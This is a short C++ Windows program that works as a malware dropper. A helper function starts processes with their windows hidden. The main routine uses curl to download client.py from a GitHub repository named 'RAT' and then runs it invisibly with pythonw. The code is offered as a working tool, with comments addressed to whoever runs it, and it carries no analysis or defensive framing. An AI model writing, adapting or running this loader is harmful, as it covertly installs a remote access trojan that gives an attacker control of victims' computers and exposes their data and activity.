#include <windows.h>
#include <string>

void runSilent(const std::string& cmd) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char command[1024];
    strncpy_s(command, cmd.c_str(), sizeof(command) - 1);
    command[sizeof(command) - 1] = '\0';

    CreateProcessA(
        NULL, command, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );

    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main() {
    // Download latest client from your repo
    runSilent("curl -O https://raw.githubusercontent.com/glitcho-o/RAT/main/client.py");

    // Run hidden (pythonw = no window)
    runSilent("pythonw client.py");

    return 0;
}